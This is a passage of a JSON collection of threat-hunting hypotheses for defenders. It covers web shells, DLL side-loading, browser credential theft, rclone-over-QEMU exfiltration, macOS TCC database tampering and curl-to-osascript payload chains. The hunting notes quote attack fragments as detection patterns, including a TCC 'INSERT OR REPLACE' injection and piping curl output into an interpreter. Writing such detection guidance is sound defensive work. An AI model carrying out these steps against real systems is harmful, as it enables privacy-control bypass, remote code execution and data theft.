    "techniques": [
      "T1114.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the domain compromise case, the attacker enumerated accounts with ApplicationImpersonation role assignments and used Add-MailboxPermission to grant a delegated principal full access across mailboxes — this enabled bulk email collection that is difficult to detect without monitoring permission changes\n- Exchange mailbox delegation abuse provides attackers with access to sensitive communications, internal documents, and credentials shared via email without triggering traditional data exfiltration alerts\n- ApplicationImpersonation grants the ability to read and manipulate all mailbox contents while appearing as the mailbox owner — a single compromised service account with this role can access the entire organization's email\n- Legitimate mailbox delegation follows predictable patterns (shared mailboxes, executive assistants, service accounts) that can be baselined to detect anomalous permission grants",
    "references": "- [MITRE ATT&CK T1114.002 - Email Collection: Remote Email Collection](https://attack.mitre.org/techniques/T1114/002/)\n- [Microsoft Security Blog - Containing a Domain Compromise: How Predictive Shielding Shut Down Lateral Movement](https://www.microsoft.com/en-us/security/blog/2026/04/17/domain-compromise-predictive-shielding-shut-down-lateral-movement/)\n- [Microsoft Learn - Use MailItemsAccessed to Investigate Compromised Accounts](https://learn.microsoft.com/en-us/purview/audit-log-investigate-accounts)\n- [Microsoft - Midnight Blizzard: Guidance for Responders on Nation-State Attack](https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/)\n- [CISA AA23-193A - Enhanced Monitoring to Detect APT Activity Targeting Outlook Online](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-193a)\n- [Splunk - Hunting M365 Invaders: Dissecting Email Collection Techniques](https://www.splunk.com/en_us/blog/security/hunting-m365-invaders-dissecting-email-collection-techniques.html)\n- [Splunk - O365 Elevated Mailbox Permission Assigned](https://research.splunk.com/cloud/2246c142-a678-45f8-8546-aaed7e0efd30/)\n- [Microsoft 365 Defender Hunting Queries - MailItemsAccessed Throttling (Nobelium)](https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Exfiltration/MailItemsAccessed%20Throttling%20%5BNobelium%5D.md)",
    "file_path": "Flames/H122.md"
  },
  {
    "id": "H123",
    "category": "Flames",
    "title": "An adversary has deployed a web shell on a public-facing web server (IIS, Exchange, Tomcat) for persistent command execution, indicated by w3wp.exe, tomcat.exe, or java.exe spawning cmd.exe, PowerShell, or other execution engines.",
    "tactic": "Persistence",
    "notes": "Hunt for web server processes (w3wp.exe, httpd.exe, tomcat*.exe, java.exe) spawning cmd.exe, powershell.exe, certutil.exe, or whoami.exe using process creation logs (Sysmon Event ID 1, Windows Event ID 4688). Monitor for new file creation in web server directories (wwwroot, webapps, OWA/forms) with extensions .aspx, .asp, .jsp, .php. Use file integrity monitoring on Exchange and Tomcat application directories. Look for HTTP POST requests to newly created files with unusual response sizes.",
    "tags": [
      "persistence",
      "web_shell",
      "godzilla",
      "exchange",
      "T1505.003"
    ],
    "techniques": [
      "T1505.003"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the domain compromise case, the attacker deployed Godzilla web shells on both Exchange and Tomcat servers after exploiting an IIS file-upload vulnerability — web shells provided persistent access independent of credential-based controls and survived password rotations\n- Web shells are among the most common persistence mechanisms for initial access brokers and APT groups targeting public-facing infrastructure — they require no outbound C2 channel, making them invisible to network-based detection\n- The process lineage of web server processes spawning command interpreters is highly anomalous and produces reliable detection signals with very low false-positive rates in most environments\n- Godzilla web shells specifically use encrypted communication that bypasses signature-based detection, making behavioral hunting (process lineage, file creation in web directories) the most reliable detection approach",
    "references": "- [MITRE ATT&CK T1505.003 - Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/)\n- [Microsoft Security Blog - Containing a Domain Compromise: How Predictive Shielding Shut Down Lateral Movement](https://www.microsoft.com/en-us/security/blog/2026/04/17/domain-compromise-predictive-shielding-shut-down-lateral-movement/)\n- [HHS HC3 - The Godzilla Webshell Analyst Note](https://www.aha.org/cybersecurity-government-intelligence-reports/2024-11-12-hc3-tlp-clear-analyst-note-godzilla-webshell)\n- [Splunk - Detect Webshell Exploit Behavior](https://research.splunk.com/endpoint/22597426-6dbd-49bd-bcdc-4ec19857192f/)\n- [NSA/CISA - Mitigating Web Shells YARA Rules](https://github.com/nsacyber/Mitigating-Web-Shells/blob/master/extended.webshell_detection.yara)\n- [Malpedia - Godzilla Webshell](https://malpedia.caad.fkie.fraunhofer.de/details/jsp.godzilla_webshell)",
    "file_path": "Flames/H123.md"
  },
  {
    "id": "H124",
    "category": "Flames",
    "title": "An adversary is side-loading a malicious DLL (such as CRYPTBASE.dll) by placing it in the same directory as a legitimate signed executable, indicated by known-abused DLLs loading from user-writable paths rather than System32.",
    "tactic": "Defense Evasion",
    "notes": "Hunt for Sysmon Event ID 7 (image loaded) where known-abused DLLs (CRYPTBASE.dll, VERSION.dll, dbghelp.dll, winmm.dll) load from user-writable paths (Downloads, AppData, ProgramData, Temp) instead of C:\\Windows\\System32. Cross-reference with HijackLibs for the full list of vulnerable DLL/application pairs. Monitor for unsigned DLLs loaded by signed executables in non-standard directories. Look for recently created DLL files co-located with legitimate portable executables.",
    "tags": [
      "defense_evasion",
      "dll_search_order_hijacking",
      "sideloading",
      "cryptbase",
      "T1574.001"
    ],
    "techniques": [
      "T1574.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the Deception.Pro STXRAT case, the attacker trojanized a CPU-Z installer and placed a malicious CRYPTBASE.dll alongside it — when the signed CPU-Z binary executed, it loaded the attacker's DLL instead of the legitimate system copy, achieving code execution under a trusted process\n- DLL search order hijacking exploits a fundamental Windows behavior where executables search their own directory before System32, making it a reliable and widely-used defense evasion technique across commodity and APT malware\n- CRYPTBASE.dll is loaded by 37+ legitimate applications according to HijackLibs, making it one of the most commonly abused DLLs — monitoring for its load from non-system paths provides broad coverage across multiple malware families\n- The detection signal (known DLL loading from user-writable path) is high-fidelity because legitimate software installations place DLLs in program directories or System32, not in Downloads, Temp, or AppData folders",
    "references": "- [MITRE ATT&CK T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001/)\n- [Deception.Pro - Trojanized CPU-Z Delivers STXRAT, Steals Credentials, and Exfils Data](https://blog.deception.pro/blog/cpuz-trojan-stxrat-purelogs-data-exfil-april-2026)\n- [HijackLibs - CRYPTBASE.dll Sideload Entry](https://hijacklibs.net/entries/microsoft/built-in/cryptbase.html)\n- [Splunk - Windows Known Abused DLL Created](https://research.splunk.com/endpoint/ea91651a-772a-4b02-ac3d-985b364a5f07/)\n- [Elastic - Unsigned DLL Side-Loading from a Suspicious Folder](https://www.elastic.co/guide/en/security/current/unsigned-dll-side-loading-from-a-suspicious-folder.html)\n- [Detection.FYI - Potential Initial Access via DLL Search Order Hijacking](https://detection.fyi/sigmahq/sigma/windows/file/file_event/file_event_win_initial_access_dll_search_order_hijacking/)\n- [Red Canary Atomic Red Team - T1574.001 DLL Search Order Hijacking](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/T1574.001.md)",
    "file_path": "Flames/H124.md"
  },
  {
    "id": "H125",
    "category": "Flames",
    "title": "An adversary is using InstallUtil.exe with the /u (uninstall) flag to proxy-execute a malicious .NET assembly from a Temp directory, bypassing application whitelisting controls.",
    "tactic": "Defense Evasion",
    "notes": "Hunt for InstallUtil.exe process creation (Sysmon Event ID 1) with the /u flag targeting DLL or EXE files in %TEMP%, %APPDATA%, or other user-writable directories. Monitor for InstallUtil.exe making outbound network connections (Sysmon Event ID 3) — legitimate installations rarely require network access. Correlate with preceding csc.exe compilations in Temp directories, which indicate dynamic .NET assembly generation before proxy execution. Look for InstallUtil.exe executed outside of software deployment windows. Also monitor .NET CLR ETW events (Microsoft-Windows-DotNETRuntime provider) for assembly loads triggered by InstallUtil from non-standard paths. Note that attackers may copy InstallUtil.exe to a different directory — hunt for any process calling System.Configuration.Install.ManagedInstallerClass from user-writable locations.",
    "tags": [
      "defense_evasion",
      "installutil",
      "lolbin",
      "proxy_execution",
      "T1218.004"
    ],
    "techniques": [
      "T1218.004"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the STXRAT intrusion, the attacker used InstallUtil.exe /u to launch the PureHVNC remote access component from a compiled DLL in %TEMP% — this LOLBin technique executes attacker code through a Microsoft-signed binary, bypassing application whitelisting and many EDR heuristics\n- InstallUtil's /u flag triggers the Uninstall() method of a .NET assembly, which attackers use to execute arbitrary code without triggering standard execution monitoring focused on the Install() path\n- The combination of csc.exe dynamic compilation followed by InstallUtil proxy execution is a specific kill chain step observed in STXRAT/PureHVNC deployments — detecting either artifact narrows the hunt significantly\n- InstallUtil.exe targeting files in Temp directories is almost never legitimate, providing a high-confidence detection signal with minimal tuning required",
    "references": "- [MITRE ATT&CK T1218.004 - System Binary Proxy Execution: InstallUtil](https://attack.mitre.org/techniques/T1218/004/)\n- [Deception.Pro - Trojanized CPU-Z Delivers STXRAT, Steals Credentials, and Exfils Data](https://blog.deception.pro/blog/cpuz-trojan-stxrat-purelogs-data-exfil-april-2026)\n- [Splunk - Signed Binary Proxy Execution InstallUtil Analytics Story](https://research.splunk.com/stories/signed_binary_proxy_execution_installutil/)\n- [Elastic - InstallUtil Process Making Network Connections](https://www.elastic.co/guide/en/security/current/prebuilt-rule-0-14-3-installutil-process-making-network-connections.html)\n- [LOLBAS Project - InstallUtil](https://lolbas-project.github.io/lolbas/Binaries/Installutil/)\n- [Detection.FYI - Suspicious Execution of InstallUtil Without Log](https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_instalutil_no_log_execution/)",
    "file_path": "Flames/H125.md"
  },
  {
    "id": "H126",
    "category": "Flames",
    "title": "An adversary is harvesting stored browser credentials by spawning headless Chrome or Edge instances with --no-sandbox flags from an unexpected parent process, indicating infostealer activity targeting browser password stores.",
    "tactic": "Credential Access",
    "notes": "Hunt for chrome.exe or msedge.exe process creation with --no-sandbox and --disable-gpu flags where the parent process is not explorer.exe, a browser updater, or a known browser launcher. The STXRAT case showed calc.exe spawning browsers — any non-browser parent should be investigated. Monitor for non-browser processes accessing Chrome \"Login Data\" or Edge \"Login Data\" SQLite databases in user profile directories. Look for temporary user-data-dir arguments pointing to randomly-named Temp subdirectories (e.g., AppData\\Local\\Temp\\{random}).",
    "tags": [
      "credential_access",
      "browser_credentials",
      "infostealer",
      "chrome",
      "T1555.003"
    ],
    "techniques": [
      "T1555.003"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the STXRAT intrusion, PureLogs Stealer was injected into calc.exe and spawned headless Chrome and Edge instances with --no-sandbox flags and temporary user-data directories to extract stored credentials — this process lineage (calc.exe → chrome.exe) is an unmistakable indicator of credential theft\n- Infostealers are the most common initial access vector for ransomware operations — detecting credential harvesting from browser stores can prevent compromised credentials from being sold on access broker markets and used for network intrusion\n- The --no-sandbox flag disables Chrome's security sandbox, which is required by stealers to access credential databases but is never used in normal browser operation — this flag in combination with a non-standard parent process is a high-confidence detection signal\n- Browser credential theft happens silently and quickly, often completing within seconds — process creation monitoring is the primary detection opportunity since the stolen data is exfiltrated through existing C2 channels",
    "references": "- [MITRE ATT&CK T1555.003 - Credentials from Password Stores: Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003/)\n- [Deception.Pro - Trojanized CPU-Z Delivers STXRAT, Steals Credentials, and Exfils Data](https://blog.deception.pro/blog/cpuz-trojan-stxrat-purelogs-data-exfil-april-2026)\n- [Splunk - Windows Credentials from Password Stores Chrome Login Data Access](https://research.splunk.com/endpoint/0d32ba37-80fc-4429-809c-0ba15801aeaf/)\n- [Elastic Security Labs - Detect Credential Access](https://www.elastic.co/security-labs/detect-credential-access)\n- [Elastic - Suspicious Web Browser Sensitive File Access](https://www.elastic.co/guide/en/security/current/suspicious-web-browser-sensitive-file-access.html)\n- [Red Canary Atomic Red Team - T1555.003 Credentials from Web Browsers](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.md)",
    "file_path": "Flames/H126.md"
  },
  {
    "id": "H127",
    "category": "Flames",
    "title": "An adversary is exfiltrating data using rclone tunneled through a local QEMU virtual machine to obscure the true source of network traffic, indicated by rclone serving a WebDAV share on localhost followed by QEMU VM network activity to external destinations.",
    "tactic": "Exfiltration",
    "notes": "Hunt for rclone.exe process creation with \"serve webdav\" arguments, especially when exposing broad paths (C:\\) on localhost. Monitor for QEMU binaries (qemu-system-*.exe) executing from non-standard locations like ProgramData, particularly with user-mode networking (-nic user) and no display (-nographic -display none). Correlate rclone localhost listeners with QEMU outbound connections to identify the tunnel pattern. Look for PowerShell downloading rclone from downloads.rclone.org and QEMU images from bitbucket.org. Alert on sustained high-volume TLS connections from QEMU processes.",
    "tags": [
      "exfiltration",
      "rclone",
      "qemu",
      "data_exfiltration",
      "vm_tunnel",
      "T1048.001"
    ],
    "techniques": [
      "T1048.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the STXRAT intrusion, the attacker used rclone to serve the entire C:\\ drive as WebDAV on localhost, then routed the traffic through a QEMU Alpine Linux VM to an external destination — this achieved 54 hours of continuous exfiltration that was difficult to attribute at the process level\n- The QEMU VM proxy technique is an evolution of traditional rclone exfiltration that defeats process-based network monitoring — the exfiltration traffic appears to originate from the VM process rather than rclone, breaking the detection chain\n- Rclone \"serve webdav\" exposing a drive root is never legitimate in enterprise environments and represents an extremely high-confidence indicator of data exfiltration regardless of the downstream tunnel mechanism\n- QEMU binaries downloaded to ProgramData (outside normal IT tooling paths) combined with Alpine Linux disk images represent attacker infrastructure deployment that can be detected through file creation and download monitoring",
    "references": "- [MITRE ATT&CK T1048.001 - Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol](https://attack.mitre.org/techniques/T1048/001/)\n- [Deception.Pro - Trojanized CPU-Z Delivers STXRAT, Steals Credentials, and Exfils Data](https://blog.deception.pro/blog/cpuz-trojan-stxrat-purelogs-data-exfil-april-2026)\n- [Splunk - Detect RClone Command-Line Usage](https://research.splunk.com/endpoint/32e0baea-b3f1-11eb-a2ce-acde48001122/)\n- [Red Canary - Rclone Wars: Transferring Leverage in a Ransomware Attack](https://redcanary.com/blog/threat-detection/rclone-mega-extortion/)\n- [CISA Advisory AA23-136A - BianLian Ransomware](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-136a)\n- [NCC Group - Detecting Rclone: An Effective Tool for Exfiltration](https://www.nccgroup.com/research/detecting-rclone-an-effective-tool-for-exfiltration/)\n- [Splunk - Detect Renamed RClone](https://research.splunk.com/endpoint/6dca1124-b3ec-11eb-9328-acde48001122/)",
    "file_path": "Flames/H127.md"
  },
  {
    "id": "H128",
    "category": "Flames",
    "title": "An adversary is hooking credential APIs or injecting into browser processes to intercept authentication material in real-time, indicated by unexpected process injection into browser processes or anomalous credential store access patterns from non-browser parent processes.",
    "tactic": "Credential Access",
    "notes": "Hunt for Sysmon Event ID 8 (CreateRemoteThread) targeting browser processes (chrome.exe, msedge.exe, firefox.exe) where the source process is NOT a known legitimate injector. Critical: filter noise by excluding source processes signed by Microsoft, Google, Mozilla, and your EDR vendor — AV/EDR tools, accessibility software, and GPU drivers routinely inject into browsers. Focus on unsigned source processes or those running from Temp/AppData/ProgramData paths. Use Sysmon Event ID 10 (ProcessAccess) with GrantedAccess values of 0x1F0FFF (PROCESS_ALL_ACCESS) or 0x0040 (PROCESS_DUP_HANDLE) targeting browser processes from non-standard parents. Look specifically for calc.exe, notepad.exe, svchost.exe (non-standard service), or other LOLBins accessing DPAPI master keys (Windows Security Event ID 4692) or Chrome/Edge \"Login Data\" SQLite databases. Correlate with Sysmon Event ID 7 showing unsigned DLLs loaded into browser process space from Temp directories. The STXRAT case showed PureLogs injected into calc.exe — filter your CreateRemoteThread results by source process global prevalence to surface rare injectors.",
    "tags": [
      "credential_access",
      "api_hooking",
      "credential_interception",
      "process_injection",
      "T1056.004"
    ],
    "techniques": [
      "T1056.004"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the STXRAT intrusion, PureLogs was injected into calc.exe to hook credential extraction APIs and spawn controlled browser instances — this technique intercepts credentials before they reach secure storage, bypassing protections like encrypted credential databases\n- API hooking operates at a level below most endpoint detection tools' visibility, making proactive hunting essential — the injection artifacts (CreateRemoteThread, cross-process memory access) are the primary detection surface\n- The pattern of a non-browser process injecting into or controlling browser processes is extremely anomalous and provides a behavioral detection signal that is resilient to malware polymorphism\n- Credential API hooking enables real-time interception of passwords, tokens, and session cookies as users authenticate, making it far more valuable to attackers than offline credential store theft",
    "references": "- [MITRE ATT&CK T1056.004 - Input Capture: Credential API Hooking](https://attack.mitre.org/techniques/T1056/004/)\n- [Deception.Pro - Trojanized CPU-Z Delivers STXRAT, Steals Credentials, and Exfils Data](https://blog.deception.pro/blog/cpuz-trojan-stxrat-purelogs-data-exfil-april-2026)\n- [FalconFriday - T1055 Process Injection with CreateRemoteThread (Noise Filtering Approach)](https://github.com/FalconForceTeam/FalconFriday/blob/master/Privilege%20Escalation/T1055-WIN-001.md)\n- [Red Canary - Process Injection Threat Detection Report](https://redcanary.com/threat-detection-report/techniques/process-injection/)\n- [Red Canary Atomic Red Team - T1056.004 Credential API Hooking](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.004/T1056.004.md)\n- [Active Countermeasures - Threat Hunting Process Injection with Sysmon](https://www.activecountermeasures.com/threat-hunting-process-injection-with-jupyter-notebook-and-sysmon/)",
    "file_path": "Flames/H128.md"
  },
  {
    "id": "H129",
    "category": "Flames",
    "title": "An adversary is reflectively loading encrypted PE payloads directly into memory on Windows to avoid disk-based detection, indicated by PowerShell or .NET processes calling Assembly.Load, Reflection APIs, or VirtualAlloc+CreateThread sequences without corresponding DLL file writes to disk.",
    "tactic": "Defense Evasion",
    "notes": "Hunt for PowerShell Script Block Logging (Event ID 4104) containing Reflection.Assembly, Assembly.Load, [System.Reflection], or Invoke-Expression patterns with byte array arguments. The PhantomPulse PHANTOMPULL loader reflectively loaded an AES-256-CBC encrypted PE entirely in memory. Monitor .NET CLR ETW events (Microsoft-Windows-DotNETRuntime provider, keyword 0x8 for Loader events) for AssemblyLoad events where the assembly path is empty or points to a memory address — this indicates in-memory loading without a backing file. Look for Sysmon Event ID 7 (image loaded) where the loaded image is unsigned and has no corresponding file on disk. Hunt for processes with anomalously high private memory (WorkingSet) relative to their on-disk module list — a process loading large payloads in memory will show a significant gap between committed memory and loaded DLLs. Also monitor for VirtualAlloc/VirtualProtect API calls changing memory permissions to RWX (PAGE_EXECUTE_READWRITE) via ETW or EDR telemetry — this is required for executing reflectively loaded code.",
    "tags": [
      "defense_evasion",
      "reflective_loading",
      "memory_only",
      "fileless",
      "windows",
      "T1620"
    ],
    "techniques": [
      "T1620"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the Elastic PhantomPulse campaign, the PHANTOMPULL loader reflectively loaded an AES-256-CBC encrypted PE payload entirely in memory, leaving no file artifact on disk for traditional AV to scan — this technique is increasingly common across both commodity and APT malware\n- Reflective loading defeats disk-based scanning, file integrity monitoring, and hash-based detection — hunting for the API calls and memory patterns is the primary detection surface on Windows\n- PowerShell Script Block Logging (4104) reliably captures .NET reflection patterns even when the assembly itself is obfuscated, making it one of the most effective data sources for this technique\n- .NET CLR ETW loader events provide visibility into in-memory assembly loading that PowerShell logging alone cannot cover — this catches reflective loading from compiled .NET executables (not just PowerShell)",
    "references": "- [MITRE ATT&CK T1620 - Reflective Code Loading](https://attack.mitre.org/techniques/T1620/)\n- [Elastic Security Labs - Phantom in the Vault: Obsidian Abused to Deliver PhantomPulse RAT](https://www.elastic.co/security-labs/phantom-in-the-vault)\n- [Red Canary - Reflective Code Loading Threat Detection Report](https://redcanary.com/threat-detection-report/techniques/reflective-code-loading/)\n- [Splunk - PowerShell Loading DotNET into Memory via Reflection](https://research.splunk.com/endpoint/85bc3f30-ca28-11eb-bd21-acde48001122/)\n- [Detection.FYI - T1620 Detection Rules Index](https://detection.fyi/tags/attack.t1620/)\n- [Microsoft - .NET Runtime ETW Events (CLR Loader)](https://learn.microsoft.com/en-us/dotnet/fundamentals/diagnostics/runtime-loader-binder-events)",
    "file_path": "Flames/H129.md"
  },
  {
    "id": "H130",
    "category": "Flames",
    "title": "An adversary has manipulated the macOS TCC database to grant unauthorized privacy permissions (camera, microphone, AppleEvents, Full Disk Access) to a malicious process, indicated by sqlite3 operations targeting TCC.db or unexpected TCC directory renaming.",
    "tactic": "Defense Evasion",
    "notes": "Hunt for sqlite3 process creation with arguments containing \"TCC.db\", \"TCC/TCC.db\", or the table name \"access\" — the injection command typically looks like `INSERT OR REPLACE INTO access VALUES('kTCCServiceAppleEvents', ...)`. Key service identifiers to watch for: kTCCServiceAppleEvents (Finder/app automation), kTCCServiceCamera, kTCCServiceMicrophone, kTCCServiceSystemPolicyAllFiles (Full Disk Access). Rename-inject-restore technique (Sapphire Sleet): Monitor ESF ES_EVENT_TYPE_NOTIFY_RENAME on both the user TCC directory (~/Library/Application Support/com.apple.TCC/) and system TCC directory (/Library/Application Support/com.apple.TCC/). The user-level TCC.db does NOT require root to modify but IS protected by FDA since Mojave — the rename trick bypasses FDA by moving the directory so tccd loses track, injecting via sqlite3, then restoring it. macOS 15.4+: Apple added ESF `tcc_modify` event type — use this for direct detection of TCC database changes. Note: this event may not fire when the database is modified via sqlite3 with root after a directory rename, so the rename detection remains critical. dscl home directory bypass (HM Surf / CVE-2024-44133): Hunt for `dscl . -change` commands modifying the NFSHomeDirectory attribute — attackers change the user's home directory, modify TCC-protected files at the real path, then change it back. Also hunt for `tccutil reset` process creation (resets all TCC permissions for a bundle ID). Unified Log: Query `log show --predicate 'subsystem == \"com.apple.TCC\"'` for permission checks, resets, and errors — unexpected permission grants without corresponding user consent prompts are indicators. Legitimate TCC grants come from user consent prompts or MDM PPPC profiles, never from direct sqlite3 modification.",
    "tags": [
      "defense_evasion",
      "tcc_bypass",
      "macos",
      "privacy_controls",
      "T1562.001"
    ],
    "techniques": [
      "T1562.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the Sapphire Sleet campaign, the attacker renamed the TCC directory, injected an AppleEvents permission for osascript via sqlite3, then restored the directory — this gave the malware unrestricted Finder automation without triggering any user consent prompt\n- TCC is macOS's primary defense against unauthorized access to sensitive resources (camera, microphone, contacts, disk access) — bypassing it silently removes a critical security boundary and enables data collection without user awareness\n- TCC bypasses are discovered regularly (CVE-2024-44133/HM Surf via dscl, CVE-2023-32364 via symlink, CVE-2021-30713/XCSSET via code injection) — monitoring sqlite3 access to TCC.db and directory renames provides a catch-all detection regardless of the specific bypass technique\n- Direct TCC.db modification is never performed by legitimate applications — legitimate TCC grants come only from user consent prompts or MDM PPPC (Privacy Preferences Policy Control) profiles, making any sqlite3 or dscl-based modification a high-confidence indicator",
    "references": "- [MITRE ATT&CK T1562.001 - Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)\n- [Microsoft Security Blog - Dissecting Sapphire Sleet's macOS Intrusion](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)\n- [Microsoft Security Blog - HM Surf: macOS TCC Bypass via Safari (CVE-2024-44133)](https://www.microsoft.com/en-us/security/blog/2024/10/17/new-macos-vulnerability-hm-surf-could-lead-to-unauthorized-data-access/)\n- [Objective-See - Apple Finally Adds TCC Events to Endpoint Security (macOS 15.4)](https://objective-see.org/blog/blog_0x7F.html)\n- [Elastic - Potential Privacy Control Bypass via TCCDB Modification](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/macos/defense_evasion_privacy_controls_tcc_database_modification)\n- [SentinelOne Labs - Bypassing macOS TCC User Privacy Protections](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)\n- [Huntress - Full Transparency: Controlling Apple's TCC](https://www.huntress.com/blog/full-transparency-controlling-apples-tcc-part-ii)\n- [Rainforest QA - A Deep Dive into macOS TCC.db](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)",
    "file_path": "Flames/H130.md"
  },
  {
    "id": "H131",
    "category": "Flames",
    "title": "An adversary has installed a malicious Launch Daemon on macOS masquerading as a legitimate Apple or Google service, indicated by plist file creation in /Library/LaunchDaemons with non-Apple-signed binaries or suspicious naming patterns (com.google.webkit.service, com.apple.cli).",
    "tactic": "Persistence",
    "notes": "Hunt for new plist file creation in /Library/LaunchDaemons/ using file creation events (es_event_create_t or Endpoint Security Framework). Cross-reference the ProgramArguments binary against code signing using `codesign -dvvv` — legitimate Apple daemons are signed by Apple, legitimate Google daemons by Google. The Sapphire Sleet campaign installed com.google.webkit.service.plist pointing to an unsigned backdoor. Monitor for launchctl load/bootstrap commands immediately following plist creation. Check for plists with RunAtLoad set to true pointing to unsigned or ad-hoc signed binaries. Inspect KeepAlive and StartInterval keys — persistent restart behavior is common in implants. Use `launchctl list` to enumerate loaded daemons and cross-reference against known-good baselines.",
    "tags": [
      "persistence",
      "launch_daemon",
      "macos",
      "masquerading",
      "T1543.004"
    ],
    "techniques": [
      "T1543.004"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the Sapphire Sleet campaign, the attacker installed a Launch Daemon named com.google.webkit.service.plist in /Library/LaunchDaemons — this provided root-level persistence that survives reboots and user logouts, and the naming convention was designed to blend in with legitimate Google services\n- Launch Daemons run as root and execute before user login, making them the highest-privilege persistence mechanism on macOS — detecting unauthorized daemon installation is critical for identifying compromised hosts\n- Legitimate Launch Daemon installations are rare in normal operations and typically only occur during software installation by signed packages — monitoring /Library/LaunchDaemons/ for new file creation provides a high-fidelity alerting surface\n- The combination of masquerading names (mimicking Apple/Google) with unsigned or ad-hoc signed binaries creates a reliable detection pattern that catches this campaign and similar macOS implants",
    "references": "- [MITRE ATT&CK T1543.004 - Create or Modify System Process: Launch Daemon](https://attack.mitre.org/techniques/T1543/004/)\n- [Microsoft Security Blog - Dissecting Sapphire Sleet's macOS Intrusion](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)\n- [Elastic - LaunchDaemon Creation or Modification and Immediate Loading](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/macos/persistence_creation_modif_launch_deamon_sequence)\n- [Elastic - Creation of Hidden Launch Agent or Daemon](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/macos/persistence_evasion_hidden_launch_agent_deamon_creation)\n- [Detection.FYI - Persistence via Suspicious Launch Agent or Launch Daemon](https://detection.fyi/elastic/detection-rules/macos/persistence_suspicious_launch_agent_or_launch_daemon/)\n- [Apple Developer - Daemons and Services Programming Guide](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html)",
    "file_path": "Flames/H131.md"
  },
  {
    "id": "H132",
    "category": "Flames",
    "title": "An adversary is using cascading curl-to-osascript or curl-to-shell chains on macOS to download and immediately execute multi-stage payloads without writing intermediate files to disk, indicated by curl output piped directly to osascript, bash, or zsh.",
    "tactic": "Execution",
    "notes": "Hunt for process creation events where curl's output is piped to osascript, sh, bash, or zsh — this pattern appears in command-line arguments as \"curl ... | osascript\" or as parent-child process relationships. The Sapphire Sleet campaign used 5 sequential stages (mac-cur1 through mac-cur5) with distinct user-agent strings to track campaign progress. Monitor for curl processes with custom user-agent strings (mac-cur*, audio, beacon) followed by interpreter execution. Look for curl invoked with --silent/-s flag (suppresses progress output, standard in attack scripts) piped to any interpreter. Monitor for osascript -e executing inline AppleScript or JavaScript (osascript -l JavaScript -e) received from network sources. Also look for Script Editor (or Obsidian per the PhantomPulse campaign) spawning curl or shell processes — application process trees should not include network download utilities.",
    "tags": [
      "execution",
      "applescript",
      "curl_pipe",
      "macos",
      "fileless",
      "T1059.002"
    ],
    "techniques": [
      "T1059.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the Sapphire Sleet campaign, the entire infection chain from initial lure to full compromise was orchestrated through cascading curl-to-osascript chains — each stage downloaded and executed the next without writing persistent scripts to disk, making forensic recovery of the full chain difficult\n- The curl-pipe-execute pattern is macOS's equivalent of Windows PowerShell cradles — it's a fundamental technique for fileless payload delivery that bypasses file quarantine, Gatekeeper, and on-disk scanning\n- Custom user-agent strings in curl requests (mac-cur1 through mac-cur5) serve as campaign tracking beacons that are trivially detectable through network monitoring or process command-line auditing\n- Script Editor or note-taking applications (Obsidian in the PhantomPulse case) spawning curl or shell interpreters is highly anomalous and provides a reliable behavioral detection signal regardless of payload obfuscation",
